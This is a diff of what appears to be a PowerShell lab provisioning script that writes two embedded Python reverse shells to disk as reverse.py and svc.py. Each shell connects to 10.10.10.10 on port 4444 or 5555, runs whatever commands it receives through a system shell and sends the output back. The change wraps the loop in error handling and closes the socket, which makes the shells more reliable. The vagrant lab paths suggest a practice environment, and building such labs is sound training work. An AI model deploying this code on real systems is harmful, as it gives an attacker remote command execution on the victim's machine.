@@ -21,11 +21,15 @@ import socket, subprocess
 s = socket.socket()
 s.connect(('10.10.10.10', 4444))
 while True:
-    cmd = s.recv(1024).decode().strip()
-    if not cmd:
+    try:
+        cmd = s.recv(1024).decode().strip()
+        if not cmd:
+            break
+        output = subprocess.run(cmd, shell=True, capture_output=True)
+        s.send(output.stdout + output.stderr)
+    except (ConnectionResetError, BrokenPipeError, OSError):
         break
-    output = subprocess.run(cmd, shell=True, capture_output=True)
-    s.send(output.stdout + output.stderr)
+s.close()
 "@
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", $reverseShell)
 
@@ -36,11 +40,15 @@ import socket, subprocess
 s = socket.socket()
 s.connect(('10.10.10.10', 5555))
 while True:
-    cmd = s.recv(1024).decode().strip()
-    if not cmd:
+    try:
+        cmd = s.recv(1024).decode().strip()
+        if not cmd:
+            break
+        output = subprocess.run(cmd, shell=True, capture_output=True)
+        s.send(output.stdout + output.stderr)
+    except (ConnectionResetError, BrokenPipeError, OSError):
         break
-    output = subprocess.run(cmd, shell=True, capture_output=True)
-    s.send(output.stdout + output.stderr)
+s.close()
 "@
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\svc.py", $svcShell)
 
